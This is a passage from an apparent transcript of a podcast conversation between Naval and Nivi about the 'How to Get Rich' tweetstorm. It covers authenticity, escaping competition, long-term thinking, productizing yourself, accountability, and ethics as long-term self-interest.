non-transactional meetings. I don\u2019t do meetings without a strict agenda. I don\u2019t do meetings unless we absolutely have to.\u201d Nivi used to do this. When people asked us for get-to-know-you meetings, he would say, \u201cWe don\u2019t do meetings unless it\u2019s life-and-death urgent.\u201d The person has to respond, \u201cYeah, it\u2019s life-and-death urgent\u201d or there\u2019s no meeting. People will meet with you when you have proof of work Busy people will take your meeting when you have something important or valuable. But you have to come with a proper calling card. It should be: \u201cHere\u2019s what I\u2019ve done. Here\u2019s what I can show you. Let\u2019s meet if this is useful to you, and I\u2019ll be respectful of your time.\u201d You have to build up credibility. For example, when a tech investor looks at a startup, the first thing they want to see is evidence of product progress. They don\u2019t just want to see a slide deck. Product progress is the entrepreneur\u2019s resume. It\u2019s an unfake-able resume. You have to do the work. To use a crypto analogy, you have to have proof of work. If you have that and you truly have something interesting, then you shouldn\u2019t hesitate to put it together in an email and send it. Even then, when asking for a meeting, you want to be actionable. Free your time and mind If you think you\u2019re going to \u201cmake it\u201d by networking and attending a bunch of meetings, you\u2019re probably wrong. Networking can be important early in your career. And you can get serendipitous with meetings. But the odds are pretty low. When you meet people hoping for that lucky break, you\u2019re relying on Type One luck , which is blind luck, and Type Two luck, which is hustle luck. But you\u2019re not getting Type Three or Type Four luck, which are the better kinds. This is where you spend time developing a reputation and working on something. You develop a unique point of view and are able to spot opportunities that others can\u2019t. A busy calendar and a busy mind will destroy your ability to do great things in this world. If you want to do great things\u2014whether you\u2019re a musician or entrepreneur or investor\u2014you need free time and a free mind. Keep Redefining What You Do Become the best in the world at what you do Keep redefining what you do until you\u2019re the best at what you do Nivi: We talked about the importance of working hard and valuing your time. Next, there are a few tweets on the topic of working for the long-term. The first tweet is: \u201c Become the best in the world at what you do. Keep redefining what you do until this is true. \u201d Naval: If you really want to get paid in this world, you want to be number one at whatever you do. It can be niche\u2014that\u2019s the point. You can literally get paid for just being you. Some of the more successful people in the world are that way. Oprah gets paid for being Oprah. Joe Rogan gets paid for being Joe Rogan. They\u2019re being authentic to themselves. You want to be number one. And you want to keep changing what you do until you\u2019re number one. You can\u2019t just pick something arbitrary. You can\u2019t say, \u201cI\u2019m going to be the fastest runner in the world,\u201d and now you have to beat Usain Bolt. That\u2019s too hard of a problem. Keep changing your objective until it arrives at your specific knowledge, skill sets, position, capabilities, location and interests. Your objective and skills should converge to make you number one. When you\u2019re searching for what to do, you have two different foci to keep in mind. One is, \u201cI want to be the best at what I do.\u201d The second is, \u201cWhat I do is flexible, so that I\u2019m the best at it.\u201d You want to arrive at a comfortable place where you feel, \u201cThis is something I can be amazing at, while still being authentic to who I am.\u201d It\u2019s going to be a long journey. But now you know how to think about it. Find founder-product-market fit The most important thing for any company is to find product-market fit. But the most important thing for any entrepreneur is to find founder-product-market fit, where you are naturally inclined to to build the right product for a market. That\u2019s a three-foci problem. You have to make all three work at once. If you want to be successful in life, you have to get comfortable managing multi-variate problems and multiple-objective functions at once. This is one of those cases where you have to map at least two or three at once. Escape Competition Through Authenticity Nobody can compete with you on being you Competition will trap you in a lesser game Nivi: Let\u2019s discuss your tweet: \u201c Escape competition through authenticity. \u201d It sounds like part of this is a search for who you are. Naval: It\u2019s both a search and a recognition. Sometimes when we search our egos, we want to be something that we\u2019re not. Our friends and family are actually better at telling us who we are. Looking back at what we\u2019ve done is a better indicator of who we are. Peter Thiel talks a lot about how competition is besides the point . It\u2019s counterproductive. We\u2019re highly memetic creatures. We copy everybody around us. We copy our desires from them. If everyone around me is a great artist, I want to be an artist. If everyone around me is a great businessperson, I want to be a businessperson. If everybody around me is a social activist, I want to be a social activist. That\u2019s where my self-esteem will come from. You have to be careful when you get caught up in status games. You end up competing over things that aren\u2019t worth competing over. Peter Thiel talks about how he was going to be a law clerk because everybody at law school wanted to clerk for a Supreme Court justice or some famous judge. He got rejected, and that\u2019s what made him go into business. It helped him break out of a lesser game and into a greater game. Sometimes you get trapped in the wrong game because you\u2019re competing. The best way to escape competition\u2014to get away from the specter of competition, which is not just stressful and nerve-wracking but also will drive you to the wrong answer\u2014is to be authentic to yourself. No one can compete with you on being you If you are building and marketing something that\u2019s an extension of who you are, no one can compete with you. Who\u2019s going to compete with Joe Rogan or Scott Adams? It\u2019s impossible. Is somebody else going write a better Dilbert? No. Is someone going to compete with Bill Watterson and create a better Calvin and Hobbes ? No. Artist are, by definition, authentic. Entrepreneurs are authentic, too. Who\u2019s going to be Elon Musk? Who\u2019s going to be Jack Dorsey? These people are authentic, and the businesses and products they create are authentic to their desires and means. If somebody else came along and started launching rockets, I don\u2019t think it would faze Elon one bit. He\u2019s still going to get to Mars. Because that\u2019s his mission, insane as it seems. He\u2019s going to accomplish it. Authenticity naturally gets you away from competition. Does it mean that you want to be authentic to the point where there\u2019s no product-market fit? It may turn out that you\u2019re the best juggler on a unicycle. But maybe there isn\u2019t much of a market for that, even with YouTube videos. So you have to adjust until you find product-market fit. At least lean towards authenticity, towards getting away from competition. Competition leads to copy-catting and playing the completely wrong game. In entrepreneurship, the masses are never right In entrepreneurship, the masses are never right. If the masses knew how to build great things and create great wealth, we\u2019d all be rich by now. When you see a lot of competition, sometimes that indicates the masses have already arrived. It\u2019s already competed over too much. Or it\u2019s the wrong trend to begin with. On the other hand, if the whole market is empty, that can be a warning indicator. It can indicate you\u2019ve gone too authentic and should focus more on the product-market part of founder-product-market fit. There\u2019s a balance you have to find. Generally, people will make the mistake of paying too much attention to the competition. The great founders tend to be authentic iconoclasts. Combine your vocation and avocation Nivi: Do you think one way of getting to authenticity is by finding five or six various skills you already do and stacking them on top of each other, maybe not even in any purposeful way? If you are expressing who you are, you\u2019re going to be expressing all of these skills anyway. Naval: If you are successful, in the long-term you\u2019ll find you\u2019re almost doing all of your hobbies for a living, no matter what they are. As Robert Frost said, \u201c my goal in life is to unite my avocation with my vocation . \u201d That\u2019s really where life is going to lead you anyway. You\u2019re right about the skill stack. Everyone has multiple skills. We aren\u2019t one-dimensional creatures, even though that\u2019s how we portray ourselves in online profiles to get employed. You meet somebody and they say, \u201cI\u2019m a banker.\u201d Or, \u201cI\u2019m a bartender. Or \u201cI\u2019m a barber.\u201d Specialize in being you But people are multivariate. They have a lot of skills. One banker might be good at finance. Another one might be good at sales. A third one might be good at macroeconomic trends and have a feel for markets. Another one might be really good at picking individual stocks. Another might be good at maintaining relationships, rather than selling new relationships. Everyone\u2019s going to have various niches. And you\u2019re going to have multiple niches. It\u2019s not going to be just one. As you go through your career, you\u2019ll find you gravitate towards the things you\u2019re good at, which by definition are the things you enjoy doing. Otherwise, you wouldn\u2019t be good at them. You wouldn\u2019t have put in the time. Other people will push you towards the things you\u2019re good at, too. Because your smart bosses, co-workers and investors will realize you\u2019re world-class in this one thing. And you can recruit people to help you with other things. Ideally, you want to end up specializing in being you. Play Stupid Games, Win Stupid Prizes Competition will blind you to greater games Businesses that seem like they\u2019re in direct competition really aren\u2019t Nivi: When you\u2019re being authentic, you don\u2019t mind competition that much. It pisses you off and inspires some fear, jealousy and other emotions. But you don\u2019t really mind because you\u2019re oriented towards the goal and the mission. Worst-case, you might get some ideas from them. And often there are ways to work with the competition in a positive way that ends up increasing the size of the market for you. Naval: It depends on the nature of the business. The best Silicon Valley tech industry businesses tend to be winner-take-all. When you see competition, it can make you fly into a rage. Because it really does endanger everything you\u2019ve built. If I\u2019m opening a restaurant and a more interesting version of the same restaurant opens in a different town, that\u2019s fantastic. I\u2019m going to copy what\u2019s working and drop what\u2019s not working. So it depends on the nature of the business. Often, businesses that seem to be in direct competition really aren\u2019t. They end up adjacent or slightly different. You\u2019re one step away from a completely different business, and sometimes you need to take that step. You\u2019re not going to take it if you\u2019re busy fighting over a booby prize. You\u2019re playing a stupid game. You\u2019re going to win a stupid prize. It\u2019s not obvious right now because you\u2019re blinded by competition. But three years from now, it\u2019ll be obvious. My first company got caught in the wrong game One of my first startups was Epinions , an online product review site that was independent of Amazon. That space eventually turned into TripAdvisor and Yelp, which is where we should have gone. We should have done more local reviews. A review of a scarce item like a local restaurant is more valuable than one of an item like a camera that has 1,000 reviews on Amazon. Before we could get there, we got caught up in the comparison-shopping game. We merged with DealTime and competed with a bunch of price-comparison engines\u2014mySimon, PriceGrabber, NexTag and Bizrate, which became Shopzilla. We were caught in fierce competition with each other. That whole space went to zero because Amazon won e-tail completely. There was no need for price comparison. Everyone just went to Amazon. We got the booby prize because we were caught up in competition with a bunch of our peers. We should have been looking at what the consumer really wanted and being authentic to ourselves, which was reviews, not price comparison. We should have gone further into esoteric items where customers had less data and wanted reviews more badly. If we stayed authentic to ourselves, we would have done better. Eventually You Will Get What You Deserve On a long enough timescale, you will get paid On a long enough time scale, you will get paid Nivi: We\u2019re talking about working for the long-term. The next tweet on that topic: \u201c Apply specific knowledge, with leverage, and eventually you will get what you deserve. \u201d I would add: Apply judgment, apply accountability, and apply the skill of reading. Naval: This one is a glib way of saying, \u201cIt takes time.\u201d Once you have all of the pieces in place, there\u2019s still an indeterminate amount of time you have to put in. And if you\u2019re counting, you\u2019ll run out of patience before it arrives. You have to make sure you give these things time. Life is long. Charlie Munger had a line on this. Somebody asked him about making money. He said what the questioner actually was asking was, \u201c How can I become like you, except faster ?\u201d Everybody wants it immediately. But the world is an efficient place. Immediate doesn\u2019t work. You have to put in the time. You have to put in the hours. You have to put yourself in that position with specific knowledge, accountability, leverage and an authentic skill-set in order to be the best in the world at what you do. And then you have to enjoy it and keep doing it and doing it and doing it. Don\u2019t keep track. Don\u2019t keep count. Because if you do, you will run out of time. Looking back on my career, the people who I identified as brilliant and hardworking two decades ago are all successful now, almost without exception. On a long enough timescale, you will get paid. But it can easily be 10 or 20 years. Sometimes it\u2019s five. If it\u2019s five, or three, and it\u2019s a friend of yours who got there, it can drive you insane. But those are exceptions. And for every winner, there are multiple failures. One thing that\u2019s important in entrepreneurship: You just have to be right once. You get many, many shots on goal. You can take a shot on goal every three to five years, maybe every 10 at the slowest. Or once every year at the fastest, depending on how you\u2019re iterating with startups. But you only have to be right once. What are you really good at, that the market values? Nivi: Your eventual outcome will be equal to something like the distinctiveness of your specific knowledge; times how much leverage you can apply to that knowledge; times how often your judgment is correct; times how singularly accountable you are for the outcome; times how much society values what you\u2019re doing. Then you compound that with how long you can keep doing it and how long you can keep improving it through reading and learning. Naval: That\u2019s a really good way to summarize it. It\u2019s worth trying to sketch that equation out. That said, people try to apply mathematics to what is really philosophy. I\u2019ve seen this happen, where I say one thing and then I say another thing that seems contradictory if you treat it as math. But it\u2019s obviously in a different context. People will say, \u201cYou say, \u2018 Desire is suffering .\u2019\u201d You know, the Buddhist saying. \u201cAnd then you \u2018All greatness comes from suffering.\u2019 So does that mean all greatness comes from desire?\u201d This isn\u2019t math. You can\u2019t just carry variables around and form absolute logical outputs. You have to know when to apply things. One can\u2019t get too analytical about it. It\u2019s what a physicist would call \u201cfalse precision.\u201d When you take two made-up estimates and multiply them together, you get four degrees of precision. Those decimal points don\u2019t actually count. You don\u2019t have that data. You don\u2019t have that knowledge. The more estimated variables you have, the greater the error in the model. Adding more complexity to your decision-making process gets you a worse answer. You\u2019re better off picking the single biggest thing or two. Ask yourself: What am I really good at, according to observation and people I trust, that the market values? Those two variables alone are probably good enough. If you\u2019re good at it, you\u2019ll keep it up. You\u2019ll develop the judgment. If you\u2019re good at it and you like to do it, eventually people will give you the resources and you won\u2019t be afraid to take on accountability. So the other pieces will fall into place. Product-market fit is inevitable if you\u2019re doing something you love and the market wants it. Reject Most Advice Most advice is people giving you their winning lottery ticket numbers The best founders listen to everyone but make up their own mind Nivi: One of the tweets from the cutting-room floor was: \u201cAvoid people who got rich quickly. They\u2019re just giving you their winning lottery ticket numbers.\u201d Naval: This is generally true of most advice. It goes back to Scott Adams\u2014 systems not goals . If you ask a successful person what worked for them, they often read out the exact set of things that worked for them, which might not apply to you. They\u2019re just reading you their winning lottery ticket numbers. It\u2019s a little glib. There is something to be learned, but you can\u2019t take their exact circumstance and map it onto yours. The best founders I know read and listen to everyone. But then they ignore everyone and make up their own mind. They have their own internal model of how to apply things to their situation. And they do not hesitate to discard information. If you survey enough people, all of the advice will cancel to zero. You have to have your own point of view. When something is sent your way, you have to quickly decide: Is it true? Is it true outside of the context of how that person applied it? Is it true in my context? And then, Do I want to apply it? You have to reject most advice. But you have to listen to enough of it, and read enough of it, to know what to reject and what to accept. Even in this podcast, you should examine everything. If something doesn\u2019t feel true to you, put it down. Set it aside. If too many things seem untrue, delete this podcast. Advice offers anecdotes to recall later, when you get your own experience Nivi: I think the most dangerous part of taking advice is that the person who gave it to you isn\u2019t going to be around to tell you when it doesn\u2019t apply any more. Naval: I view the purpose of advice a little differently than most people. I view it as helping me have anecdotes and maxims that I can recall when I have my own direct experience and say, \u201cAh, that\u2019s what that person meant.\u201d Ninety percent of my tweets are maxims that become mental hooks to remind me when I\u2019m in that situation again. Like, \u201cOh, I\u2019m the one who tweeted, \u2018 If you can\u2019t see yourself working with someone for life, then don\u2019t work with them for a day. \u2019\u201d As soon as I know I\u2019m not going to be working with someone 10 years from now, then I have to start extricating myself from that relationship or investing less effort in it. I use tweets to compress my own learnings. Your brain space is finite. You have finite neurons. You can think of these as pointers, addresses, mnemonics to help you remember deep-seated principles where you have the underlying experience to back it up. If you don\u2019t have the underlying experience, then it reads like a collection of quotes. It\u2019s cool. It\u2019s inspirational for a moment. Maybe you make a nice poster out of it. But then you forget it and move on. These are compact ways for you to recall your own knowledge. A Calm Mind, a Fit Body, a House Full of Love When you\u2019re finally wealthy, you\u2019ll realize it wasn\u2019t what you were seeking in the first place When you\u2019re wealthy, you\u2019ll realize it wasn\u2019t what you were seeking Nivi: The last tweet on the topic of working for the long-term is: \u201c When you\u2019re finally wealthy, you\u2019ll realize it wasn\u2019t what you were seeking in the first place. But that\u2019s for another day. \u201d Naval: That\u2019s a multi-hour topic in and of itself. First of all, I thought it was a really clever way to end the whole thing. It disarms a whole set of people who say, \u201cWhat\u2019s the point of getting rich?\u201d There are a lot of people who like to virtue signal against the idea of wealth creation or making money. It\u2019s also true. Yes, money will solve all your money problems. But it doesn\u2019t get you everywhere. The first thing you realize when you\u2019ve made a bunch of money is that you\u2019re still the same person. If you\u2019re happy, you\u2019re happy. If you\u2019re unhappy, you\u2019re unhappy. If you\u2019re calm and fulfilled and peaceful, you\u2019re still that same person. I know lots of very rich people who are extremely out of shape. I know lots of rich people who have really bad family lives. I know lots of rich people who are internally a mess. A calm mind, a fit body and a house full of love must be earned I would lean on another tweet that I put out. When I think back on it, I think it\u2019s my favorite tweet. It\u2019s not necessarily the most insightful. It\u2019s not necessarily the most helpful. It\u2019s not even the one I think about the most. But when I look at it, there\u2019s such a certain truth in there that it resonates. And that is: \u201c A fit body, a calm mind, a house full of love. These things cannot be bought\u2014they must be earned. \u201d Even if you have all the money in the world, you can\u2019t have those three things. Jeff Bezos still has to work out. He still has to work on his marriage. And his internal mental state still very much won\u2019t be controlled by external events. It\u2019s going to be based on how calm and peaceful he is inside. So I think those three things\u2014your health, your mental health and your close relationships\u2014are things you have to cultivate. They can bring you a lot more peace and happiness than any amount of money ever will. Practical advice for a calmer internal state How to get there is a tweetstorm I\u2019ve been working on. I have probably 100 tweets on it. It\u2019s very hard to say anything on the topic without getting attacked from 50 different directions, especially these days on Twitter. So I\u2019ve been hesitant to do it. I want to target it for a very specific kind of person. There\u2019s a bunch of people who don\u2019t believe working on your internal state is useful. They\u2019re too focused on the external. And that\u2019s fine, there\u2019s nothing wrong with that. That\u2019s who the \u201cHow to Get Rich\u201d tweetstorm is for. There\u2019s a bunch of people who believe the only thing worth working on is complete liberation. Like, you become the Buddha. They\u2019ll attack anything in the middle as being useless. That\u2019s fine, too. But most people aren\u2019t there. I want to create a tweetstorm that offers practical advice for everyday people who want a calmer internal state. A set of understandings, realizations, half-truths and truths, that if you were to imbibe them properly\u2014and, again, these are pointers to ideas you already have and experiences you already have\u2014that if you keep these top of mind, slowly but steadily it will help you with certain realizations that will lead you to a calmer internal state. That\u2019s what I want to work on. Fitness is another big one, I\u2019m just not the expert there. There are plenty of good people on Twitter that who are better at fitness than me. A lot of divorces happen over money, a lot of battles happen over internal anger I think a loving household and relationships actually fall naturally out of the other things. If you have a calm mind and you\u2019ve already made money, you should have good relationships. There\u2019s no reason why you shouldn\u2019t. A lot of divorces happen over money. Unfortunately, that\u2019s just the reality of it. Having money removes that part of it. A lot of external battles happen because your internal state is not good. When you\u2019re naturally internally peaceful you\u2019re going to pick fewer fights. You\u2019re going to be more loving without expecting anything in return. That will take care of things on the external-relationship front. Nivi: To summarize: Money solves your money problems. Money buys you freedom in the material world. And money lets you not do the things you don\u2019t want to do. Naval: Yeah. To me the ultimate purpose of money is so you don\u2019t have to be in a specific place, at a specific time, doing anything you don\u2019t want to do. There Are No Get Rich Quick Schemes Get rich quick schemes are just someone else getting rich off you There are no get rich quick schemes Nivi: We skipped one tweet because I wanted to cover all of the tweets on the topic of the long-term. The tweet we skipped: \u201c There are no get rich quick schemes. That\u2019s just someone else getting rich off you. \u201d Naval: This goes back to the world being an efficient place. If there\u2019s an easy way to get rich, it\u2019s already been exploited. There are a lot of people who will sell you ideas and schemes on how to make money. But they\u2019re always selling you some $79.95 course or some audiobook or seminar. Which is fine. Everyone needs to eat. People need to make a living. They might actually have really good tips. If they\u2019re giving you actionable, high-quality advice that acknowledges it\u2019s a difficult journey and will take a lot of time, then I think it\u2019s realistic. But if they\u2019re selling you some get rich quick scheme\u2014whether it\u2019s crypto or whether it\u2019s an online business or seminar\u2014they\u2019re just making money off you. That\u2019s their get rich quick scheme. It\u2019s not necessarily going to work for you. We don\u2019t have ads because it would ruin our credibility One of the things about this whole tweetstorm and podcast is that we don\u2019t have ads. We don\u2019t charge for anything. We don\u2019t sell anything. Not because I don\u2019t want to make more money\u2014it\u2019s always nice to make more money; we\u2019re doing work here\u2014but because it would completely destroy the credibility of the enterprise. If I say, \u201cI know how to get rich, and I\u2019m going to sell that to you,\u201d then it ruins it. When I was young, one of my favorite books on the topic was \u201c How To Get Rich ,\u201d by Felix Dennis, the founder of Maxim Magazine. He had a lot of crazy stuff in there. But he had some really good insights too. Whenever I read something by him or by GoDaddy founder Bob Parsons or Andrew Carnegie\u2014people who are already very wealthy, and they clearly made their wealth in other fields, not by selling the how-to-get-rich line\u2014they have a credibility. You just trust them. They\u2019re not trying to make money off of you. They\u2019re obviously trying to win some status and some ego\u2014you always have to have a motivation for doing something. But at least that\u2019s a cleaner reason and why they\u2019re probably not lying. They\u2019re probably not fooling you. They\u2019re not snowing you. Every founder has to lie to every employee At some level every founder has to lie to every employee of the company they have. They have to convince them, \u201cIt\u2019s better for you to work for me than to do what I did and go work for yourself.\u201d I\u2019ve always had a hard time with that. The only honest way to do this, in my opinion, is to tell the entrepreneurs I recruit: \u201cYou\u2019re going to be entrepreneurial in this company, and the day you\u2019re ready to start your own next thing, I\u2019m going to support you. I\u2019m never going to get in the way of you starting a company. But this can be a good place for you to learn how to build a good team and build a good culture; how to find product-market fit; how to perfect your skills; and to meet some amazing people while you figure out exactly what it is you\u2019re going to do. Because positioning, timing and deliberation are very important when starting a company.\u201d What I\u2019ve never been able to do is to look them in the face and say, \u201cYou must be at your desk by 8 a.m.\u201d Because I\u2019m not going to be at my desk by 8 a.m. I want my freedom. I\u2019ve never been able to say to them, \u201cYou\u2019re great at being a director today, and you\u2019ll be a VP tomorrow,\u201d putting them into that cold career path track. Because I don\u2019t believe in it myself. Anyone giving advice on how to get rich should have made their money elsewhere If anyone is giving advice on how to get rich and they\u2019re also making money off of it, they should have made their money elsewhere. You don\u2019t want to learn how to be fit from a fat person. You don\u2019t want to learn how to be happy from a depressed person. So, you don\u2019t want to learn how to be rich from a poor person. But you also don\u2019t want to learn how to be rich from somebody who makes their money by telling people how to be rich. It\u2019s suspect. Nivi: Any time you see somebody who\u2019s gotten rich following some guru\u2019s advice on getting rich, remember that in any random process, if you run it long enough and if enough people participate in it, you will always get every single possible outcome with probability one. Naval: There\u2019s a lot of random error in there. This is why you have to absolutely and completely ignore business journalists and economist academics when they talk about private companies. I won\u2019t name names, but when a famous economist rails on Bitcoin, or when a business journalist attacks the latest company that\u2019s IPO\u2019ing, it\u2019s complete nonsense. Those people have never built anything. They\u2019re professional critics. They don\u2019t know anything about making money. All they know is how to criticize and get pageviews. And you\u2019re literally becoming dumber by reading them. You\u2019re burning neurons. I\u2019ll leave you with a quote from Nassim Taleb that I liked. He said, \u201c To become a philosopher king, start with being a king, not being a philosopher . \u201d Nivi: I\u2019m glad you brought up Taleb, because I was going to finish this by saying: remember the title of his first book, \u201c Fooled By Randomness .\u201d Naval: One of the reasons we\u2019re a little vague in this podcast is because we\u2019re trying to lay down principles that are timeless, as opposed to giving you the winning lottery ticket numbers from yesterday. Productize Yourself Figure out what you\u2019re uniquely good at, and apply as much leverage as possible Figure out what you\u2019re uniquely good at and apply as much leverage as possible Nivi: You summarized this entire tweetstorm with two words: \u201c Productize yourself. \u201d Naval: Productize has specific knowledge and leverage. Yourself has uniqueness and accountability. Yourself also has specific knowledge. So you can combine all of these pieces into these two words. If you\u2019re looking towards the long-term, you should ask yourself, \u201cIs this authentic to me? Is it myself that I\u2019m projecting?\u201d And then, \u201cAm I productizing it? Am I scaling it? Am I scaling with labor or capital or code or media?\u201d It\u2019s a very handy, simple mnemonic. What is this podcast? This is a podcast called Naval. I\u2019m literally productizing myself with a podcast. Nivi: You want to figure out what you\u2019re uniquely good at\u2014or what you uniquely are\u2014 and apply as much leverage as possible. So making money isn\u2019t even something you do. It\u2019s not a skill. It\u2019s who you are, stamped out a million times. Find hobbies that make you rich, fit and creative Naval: Making money should be a function of your identity and what you like to do. Another tweet I really liked was, \u201c Find three hobbies: One that makes you money, one that keeps you fit, and one that makes you creative. \u201d I would change that slightly. I would say: One that makes you money, one that makes you fit, and one that makes you smarter. So in my case, my hobbies would be reading and making money, as I love working with startups, investing in them, brainstorming them, starting them. I love the ideation and initial creation phase around startups. On the hobby that keeps you fit, I don\u2019t really have one. The closest thing I have is yoga, but that\u2019s where I sort of fell apart. I think people who, early in life, discover something like surfing or swimming or tennis or some kind of a sport they continue doing throughout most of their life are very lucky, because they found a hobby that will make them fit. Accountability Means Letting People Criticize You You have to stick your neck out and be willing to fail publicly Accountability means letting people criticize you Nivi: We finished discussing the tweetstorm. We\u2019re going to spend some time on Q&A and discussing tweets that didn\u2019t make it into the \u201c How to Get Rich \u201d tweetstorm. My first question: What are some common failures or things people typically do wrong when they try to apply this advice? Naval: A lot of people don\u2019t understand what specific knowledge is or how to \u201cobtain\u201d it. People don\u2019t understand what accountability entails. They think accountability means being successfully accountable. No\u2014it means you have to stick your neck out and fail publicly. You have to be willing to let people criticize you. One of the reasons I\u2019m less active on Twitter lately is because every tweet summons an army of nitpickers and haters. It gets exhausting. You have to learn to ignore them, or you won\u2019t survive on Twitter. A lot of people try to reconcile this by asking, \u201cShould I quit my 9-to-5 job or not?\u201d That can be a hard decision. You don\u2019t need to go to that extreme. You can start applying accountability, leverage and specific knowledge within your existing career. You don\u2019t necessarily need to fork off and do something else completely different. The most interesting parts should be the ones you disagree with People will use my advice as a way to agree and disagree with their existing biases. They\u2019ll say, \u201cI agree with that part,\u201d and, \u201cThat part you\u2019re completely wrong.\u201d The most interesting tweets should be the ones you disagree with\u2014because clearly I\u2019ve proven I know a few things. If you disagree with it, maybe that\u2019s an area where you can improve your thinking. I improve my thinking all the time. In this tweetstorm I put down the minimum-viable principles. I shared only a small slice of what I\u2019ve learned about how to make money; because 90% of it is suspect. I put down the bedrock, the stuff I\u2019m sure about. I have not yet seen a tweet successfully contradicting anything in this tweetstorm that would cause me to say, \u201cI got that one wrong.\u201d Get the free leverage that\u2019s available in tech Some people will say, \u201cThis only applies to tech entrepreneurs.\u201d I disagree. The real estate example was a good one in that regard. Technology drives leverage\u2014so I\u2019m going to push you in a tech direction to get that free leverage. Obviously, this message is being delivered through the Internet, so it\u2019s going to have a pro-Internet bias. Don\u2019t refuse to do things just because others can\u2019t do them Some people believe it\u2019s unfair to do anything with the opportunities they have because others don\u2019t have the same opportunities. With a defeatist attitude like that, why even get out of bed in the morning? Ninety percent of people are dead. Many people live on a dollar or less a day. Do you? No. You play the hand you\u2019re dealt to the best of your ability. Then you can take the winnings\u2014the pot from that hand\u2014and do whatever you want with it to fix the world. But if you refuse to do things just because others can\u2019t do them, you are living in denial. It\u2019s an excuse to do nothing. Realize your philanthropic vision by running a business Others believe wealth creation is fundamentally at odds with an environmentally healthy planet. They view it as a giant zero-sum game. That\u2019s a false narrative, too. Elon Musk is not playing a zero-sum game with the environment; there are plenty of entrepreneurs like him. There is a word environmentalists love: sustainability . If nothing else, for-profit businesses are financially sustainable. You can do a B Corporation , which has a dual mission. Many non-profit efforts would be better off as for-profit companies. They wouldn\u2019t have to beg for grants. They would be financially sustainable. Some great founders realize their philanthropic visions by running a business. We Should Eventually Be Working for Ourselves But we will have to make sacrifices and take on more risk This advice is for anybody who wants to be entrepreneurial Nivi: Who is this advice targeted to? Is it for my Lyft driver? Is it for an Internet entrepreneur? Is it for somebody who wants to start a YouTube channel? Naval: Because it comes from someone who\u2019s steeped in Silicon Valley and tech companies, it\u2019s always going to have a bias towards that. But I think it\u2019s good for anybody who wants to be entrepreneurial. Anybody who wants to control their own life. Anybody who wants to deterministically and reliably improve their ability to create wealth over time, is patient, and is looking at the long haul. If you\u2019re 80 years old, retired and running out of energy, it\u2019s probably best to stay retired. But there are 80-year-olds who have a lot of energy, who want to do new things and live for the future. Obviously this can apply very easily to a young person. I would say 9 or 10 years old and up. Midlife can be the most fruitful time to apply this advice The most difficult one is probably midlife. When we\u2019re in our 30s, 40s and 50s, we already have a lot invested. We have a lot of obligations. Those are the years we\u2019re earning; people are relying on us. We don\u2019t want to change, because we don\u2019t want to admit defeat. But that\u2019s when it actually can be the most fruitful. It may be the most difficult pivot: You have a 9-to-5 job; you have a family relying on you. It may seem like the things in this podcast are far too idealistic, but maybe it can inform your weekend projects. Maybe it can inform your approach to education; for example, if you\u2019re taking an online course at night. Maybe it can inform what roles you take on at your current company, because they move you closer and closer to points of leverage, points of judgment or points where you\u2019re naturally talented, and you\u2019re able to be more authentic. It might cause you to take on more accountability. Even if applied piecemeal, these principles can guide you\u2014regardless of what stage of life you are in, short of retirement. If you\u2019re retired, test them to see if they\u2019re true and then teach them to your kids or grandkids. There are many different ways to participate. It should apply to almost everybody who has a complete body, sound mind, and is looking to work. Look up the value chain to find leverage Nivi: One way to apply this advice is to look at who is getting leverage off of the work that you\u2019re doing. Look up the value chain\u2014at who\u2019s above you and who\u2019s above them\u2014and see how they are taking advantage of the time and work you\u2019re doing and how they\u2019re applying leverage. People naturally do this because they want to move up the corporate ladder; but that\u2019s mostly about managing other people. You want to manage more capital, products, media and community. People think about moving up the ladder in their organization. But they don\u2019t often think about moving to a different organization or creating their own company to get more leverage. You will do better in a small organization Naval: In general, ceteris paribus \u2014fancy Latin words for \u201call other things equal\u201d\u2014you will do better in a smaller organization than a larger one. You will have more accountability, and your work will be more visible. You\u2019re more likely to be able to try different things, which can help you discover the thing you are uniquely good at. People will be more likely to give you leverage through battlefield promotions. You\u2019ll have more flexibility. There will be more authenticity in how the company operates. Here is a good progression for a career: Start in a large company and progressively move to smaller and smaller ones. It\u2019s very hard to go from a small company to a larger company. Larger companies tend to be more about politics than merit; they\u2019re more stable but less innovative. The goal is that we are all working for ourselves The long-term goal is that we are all wealthy and working for ourselves. The people working for us are essentially robots. Today that\u2019s software robots executing code in data centers. Tomorrow it could be delivery bots, flying bots and mechanical bots\u2014and drones\u2014that are carrying things around. This goes back to the idea that the best relationships are peer relationships. If there\u2019s someone above you, that\u2019s someone to learn from. If you\u2019re not learning from them and improving, nobody should be above you. If there\u2019s somebody below you, it\u2019s because you\u2019re teaching them and enabling them. If you\u2019re not doing that, then get a robot; you don\u2019t need a human below you. This is utopian and still a long way off, but in the not-too-distant future anybody who wants to work for themself will be able to do it. You may have to make sacrifices and take on more risk. You may have to take on more accountability and live with less steady income. But more and more I think younger people are realizing that if they\u2019re going to work, they\u2019re going to work for themselves. Being Ethical Is Long-Term Greedy If you cut fair deals, you will get paid in the long run Ethics isn\u2019t something you study; it\u2019s something you do Nivi: In the \u201cHow to Get Rich\u201d tweetstorm you listed things you suggest people study, like programming, sales, reading, writing and arithmetic . One of the items that ended up on the cutting-room floor was ethics, which you also suggest people study. Naval: I was going to put that out as a concession to people who believe making money is evil and that the only way to make it is to be evil. But then I realized ethics is not necessarily something you study. It\u2019s something you think about\u2014and something you do. Everyone has a personal moral code. Where we get our moral code differs for everybody. It\u2019s not like I can point you to a textbook. I can point you to some Roman or Greek text, but that\u2019s not suddenly going to make you ethical. There\u2019s the Golden Rule : \u201cDo unto others as you would have them do unto you.\u201d Or there\u2019s Nassim Taleb\u2019s Silver Rule , which is, \u201cDon\u2019t do unto others what you don\u2019t want them doing unto you. \u201d Trust leads to compounding relationships Once you\u2019ve been in business long enough, you will realize how much of it is about trust. It\u2019s about trust because you want to compound interest. You want to work with trustworthy people for long periods of time without having to reevaluate every discussion or constantly look over your shoulder. Over time you will gravitate to working with certain kinds of people. Similarly, those people will gravitate to working with other ethical people. Being ethical attracts other long-term players Acting ethically turns out to be a selfish imperative. You want to be ethical because it attracts other long-term players in the network. They want to do business with ethical people. If you build a reputation for being ethical, people eventually will pay you just to do deals through you. Your involvement will validate deals and ensure they get done; because you wouldn\u2019t be involved with low-quality stuff. In the long-run, being ethical pays off\u2014but it\u2019s the very long run. In the short-run, being unethical pays off, which is why so many people go for it. It\u2019s short-term greedy. Being ethical is long-term greedy You can be ethical simply because you\u2019re long-term greedy. I can even outline a framework for different parts of ethics just based on the idea of long-term selfishness. For example, you want to be honest because it leaves you with a clear mind. You don\u2019t want two threads running in your 